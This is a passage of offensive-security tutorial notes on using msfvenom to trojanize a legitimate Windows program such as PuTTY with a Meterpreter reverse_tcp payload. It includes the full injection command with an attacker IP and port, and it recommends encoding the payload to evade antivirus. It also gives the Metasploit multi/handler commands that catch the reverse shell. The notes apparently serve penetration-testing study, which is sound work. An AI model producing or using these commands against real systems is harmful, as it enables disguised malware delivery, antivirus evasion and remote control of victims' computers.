**Core Concept:** This technique embeds a payload into an existing, legitimate Windows executable (e.g., `putty.exe`, `calc.exe`). This is a form of **trojanizing** and helps with both social engineering (the file looks harmless) and AV evasion (the file has a legitimate digital signature and is inherently trusted).

**How it Works:** `msfvenom` uses a template executable and injects the payload into it while preserving the original functionality. When the victim runs the file, the legitimate program opens (avoiding suspicion) while the payload executes in the background.

#### **Essential Flags & Options:**

- `-x, --template <file>`: Specifies a custom executable file to use as a template.
    
- `-k, --keep`: Preserves the template executable's functionality. **This is crucial for the attack to work correctly.** Without this flag, the original program may not run.
    

**Practical Example:**  
Inject a payload into a legitimate `putty.exe` file:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -x /path/to/putty.exe -k -f exe -o trojanized_putty.exe
```

The resulting `trojanized_putty.exe` will both open the PuTTY SSH client _and_ send a reverse shell back to the attacker.

---

### **Summary & Workflow**

A typical payload creation workflow for a client-side attack might look like this:

1. **Choose a Payload:** Decide based on OS, architecture, and connection type (e.g., `windows/meterpreter/reverse_tcp`).
    
2. **Generate the Payload:** Use `msfvenom` with `-p`, `LHOST`, `LPORT`, and `-f`.
    
3. **(Optional) Encode for AV Evasion:** Add the `-e` and `-i` flags to change the payload's signature.
    
4. **(Optional) Trojanize for Stealth:** Use the `-x` and `-k` flags to embed the payload into a legitimate file.
    
5. **Set Up the Handler:** On the attacker's machine, you **must** start a matching Metasploit multi/handler to catch the incoming connection.
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 4444
exploit
```
